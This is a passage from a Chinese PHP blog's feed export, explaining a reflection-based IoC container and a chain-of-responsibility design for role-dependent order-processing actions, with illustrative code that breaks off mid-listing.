\di\Car());  <span class="comment">// 199</span></span><br></pre></td></tr></table></figure><p>这时候，就需要IoC 容器登场了。</p><p>IoC 容器的核心是通过PHP 的 <a href="https://www.php.net/manual/en/book.reflection.php" target="_blank" rel="noopener">反射 (Reflection)</a> 来实现的。</p><p><code>IoC.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">di</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IoC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">maket</span><span class="params">($className)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $reflect = <span class="keyword">new</span> \ReflectionClass($className);</span><br><span class="line">        $construct = $reflect-&gt;getConstructor();</span><br><span class="line">        <span class="keyword">if</span> (!$construct) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> $className;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $params = $construct-&gt;getParameters();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($params)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> $className;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $args = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($params <span class="keyword">as</span> $param) &#123;</span><br><span class="line">            $class = $param-&gt;getClass();</span><br><span class="line">            <span class="keyword">if</span> ($class) &#123;</span><br><span class="line">                $args[] = <span class="keyword">static</span>::make($class-&gt;name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $reflect-&gt;newInstanceArgs($args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>person.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">di</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 需要注意：要想反射能够识别，此处必须给参数声明类型。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(car $obj)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj = $obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;obj-&gt;pay();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$boo = \di\IoC::make(<span class="string">"\di\person"</span>);</span><br><span class="line"><span class="keyword">echo</span> $boo-&gt;buy(); <span class="comment">// 199</span></span><br></pre></td></tr></table></figure><p>可以看到，即使没有手动创建Car 类，也不会影响Person 类的调用，这就是IoC 容器所解决的问题：把对象与对象之间的依赖关系隐藏到容器（存储实例化对象）中，通过自动创建的方式解决依赖关系。</p><p>这里仅仅只是抛砖引玉，用一个简单的IoC 容器例子来理解什么是依赖注入/控制反转，更多相关知识可以通过查看主流框架源码或者<a href="https://php-di.org" target="_blank" rel="noopener">PHP-DI</a> 进行学习。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://learnku.com/articles/56111" target="_blank" rel="noopener">写一个简单的IoC容器案例，理解什么是依赖注入和控制反转</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;经常会听到『依赖注入』(DependencyInjection)和『控制反转』(Inversion of Control)这两个名词，初学者往往会被其给吓住，误以为是什么特别高深的技术，其实了解了来龙去脉之后，就会发现仅仅只是名字听上去高大上而已。&lt;/p&gt;</summary>
    
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>使用职责链模式和反射解决流水线问题</title>
    <link href="https://www.0x2beace.com/use-chain-of-responsibility-pattern-and-reflection-to-solve-pipeline-problems/"/>
    <id>https://www.0x2beace.com/use-chain-of-responsibility-pattern-and-reflection-to-solve-pipeline-problems/</id>
    <published>2021-05-15T14:19:28.000Z</published>
    <updated>2021-05-15T14:29:49.138Z</updated>
    
    <content type="html"><![CDATA[<p><del>设计模式是区分程序员能力大小的一个重要因素——Boo。</del></p><a id="more"></a><h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><p>原来的业务可以看成是一条流水线，这条流水线上有各个模块有各自的职责，相互依赖但并不耦合，操作A 完成之后，才能执行操作B，操作完成之后才能执行操作C… 以此类推。</p><p>就目前的需求来看，直接使用传统的方式进行编码，各个职责所对应的功能直接写到控制器中，即可。但问题在于，同时有多个不同的角色，可能会调用该功能，比如：</p><blockquote><p>用户只能执行A、C 操作，管理员只能执行A、B、C 操作，而超级管理员则可以执行所有操作。</p></blockquote><p>如果仍然坚持使用传统的方式进行编码，那么同一个操作，可能需要在不同角色模块下各自维护一份，一旦其中某一个的需求发生了变化，那么还得同时更正好几份代码…</p><p>已知需求：</p><ul><li>每个角色所需要执行的操作内容都是一样的，并不会是因为身份是管理员或者用户，其操作就会发生变化。</li><li>所有的操作在逻辑上相互依赖，但并不耦合。</li><li>每个角色所能执行的操作是已知的。</li><li>禁止越级操作，不能直接越过A 去执行B 操作。</li></ul><h2 id="责任链模式"><a href="#责任链模式" class="headerlink" title="责任链模式"></a>责任链模式</h2><p>基于以上几点，最终选择『责任链模式』作为设计思路，原因有以下：</p><ol><li>职责链上的处理者负责处理请求，客户只需要将请求发送到职责链上即可，无须关心请求的处理细节和请求的传递，所以职责链将请求的发送者和请求的处理者解耦了。</li><li>在没达到指定条件前，会一直向下传递，直到结束流水线</li></ol><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>伪代码分析过程：</p><ol><li>新建一个订单操作类，在构造函数中分别接收用户身份和订单ID，根据当前订单状态及用户身份获取各自当前所能执行的操作（这里有个问题，如果角色增加，构造函数会因此变得复杂，可以配合使用其他设计模式代替在构造函数中赋值）。</li><li>在该类中配合PHPStorm 注解定义所有需要执行的操作</li><li>通过魔术方式<code>__call</code> 进行反射，将操作映射到具体功能实现的类中</li></ol><p>核心有两点：</p><ol><li>通过职责连获取不同角色所能执行的操作</li><li>PHPStorm 注解配合反射使用，查找并执行具体功能</li></ol><h3 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h3><p>创建职责连：</p><p>用户：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>\<span class="title">action</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserOrderActionService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $order;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAction</span><span class="params">($order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> <span class="keyword">self</span>($order))-&gt;step1();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">step1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;order-&gt;order_type == OrderType::SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">return</span> [</span><br><span class="line">                <span class="string">'actionA'</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;step2();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">step2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;order-&gt;order_type == OrderType::FAIL) &#123;</span><br><span class="line">            <span class="keyword">return</span> [</span><br><span class="line">                <span class="string">'actionD'</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;step3();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">stepEnd</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>管理员：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>\<span class="title">action</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminOrderActionService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $order;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAction</span><span class="params">($order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> <span class="keyword">self</span>($order))-&gt;step1();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">step1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;order-&gt;order_type == OrderType::SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">return</span> [</span><br><span class="line">                <span class="string">'actionA'</span>,</span><br><span class="line">                <span class="string">'actionB'</span>,</span><br><span class="line">                <span class="string">'actionC'</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;step2();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">step2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;order-&gt;order_type == OrderType::FAIL) &#123;</span><br><span class="line">            <span class="keyword">return</span> [</span><br><span class="line">                <span class="string">'actionD'</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;step3();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">stepEnd</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>超级管理员：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>\<span class="title">action</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SuperAdminOrderActionService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $order;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAction</span><span class="params">($order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> <span class="keyword">self</span>($order))-&gt;step1();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">step1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;order-&gt;order_type == OrderType::SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">return</span> [</span><br><span class="line">                <span class="string">'actionA'</span>,</span><br><span class="line">                <span class="string">'actionB'</span>,</span><br><span class="line">                <span class="string">'actionC'</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;step2();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">step2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;order-&gt;order_type == OrderType::FAIL) &#123;</span><br><span class="line">            <span class="keyword">return</span> [</span><br><span class="line">                <span class="string">'actionC'</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;step3();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">stepEnd</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤二"><a href="#步骤二" class="headerlink" title="步骤二"></a>步骤二</h3><p>虽然不同的操作操作之间并没有直接关联，此处为了方便日后功能扩展，还是将不同类型的操作进行了分类</p><p>OrderSuccessService：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderSuccessService</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionA</span><span class="params">(array $param)</span></span>&#123;</span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="comment">// 具体业务逻辑</span></span><br><span class="line">          </span><br><span class="line">       &#125;<span class="keyword">catch</span>(OrderException $exception)&#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>($exception-&gt;getMessage());</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionB</span><span class="params">(array $param)</span></span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionC</span><span class="params">(array $param)</span></span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OrderFailService：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderFailService</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionD</span><span class="params">(array $param)</span></span>&#123;</span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="comment">// 具体业务逻辑</span></span><br><span class="line">          </span><br><span class="line">       &#125;<span class="keyword">catch</span>(OrderException $exception)&#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>($exception-&gt;getMessage());</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤二-1"><a href="#步骤二-1" class="headerlink" title="步骤二"></a>步骤二</h3><p>创建OrderAction 类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>\<span class="title">action</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">OrderModel</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>\<span class="title">action</span>\<span class="title">UserOrderActionService</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>\<span class="title">action</span>\<span class="title">AdminOrderActionService</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">order</span>\<span class="title">action</span>\<span class="title">SuperAdminOrderActionService</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注解部分 </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@method</span> OrderSuccessService actionA()                操作A</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@method</span> OrderSuccessService actionB()                操作B</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@method</span> OrderSuccessService actionC()                操作C</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@method</span> OrderFailService actionD()                   操作D</span></span><br><span class="line"><span class="comment"> * // ...</span></span><br><span class="line"><span class="comment"> * Class OrderAction</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Services\order\action</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderAction</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $actionCode;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> $class = [</span><br><span class="line">      <span class="string">"App\Services\order\OrderSuccessService"</span>,</span><br><span class="line">      <span class="string">"App\Services\order\OrderFailService"</span>,</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $role_type, int $order_id)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $order = OrderModel::find($order_id);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> ($role_type) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"user"</span>:</span><br><span class="line">                <span class="keyword">$this</span>-&gt;actionCode = UserOrderActionService::getAction($order);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">case</span> <span class="string">"admin"</span>:</span><br><span class="line">                <span class="keyword">$this</span>-&gt;actionCode = AdminOrderActionService::getAction($order);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              </span><br><span class="line">            <span class="keyword">case</span> <span class="string">"superAdmin"</span>:</span><br><span class="line">                <span class="keyword">$this</span>-&gt;actionCode = superAdminOrderActionService::getAction($order);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">default</span> :</span><br><span class="line">                <span class="comment">// ... </span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">strategy</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;class <span class="keyword">as</span> $class) &#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array($name, get_class_methods($class))) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> $class(<span class="keyword">$this</span>-&gt;actionUser);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span 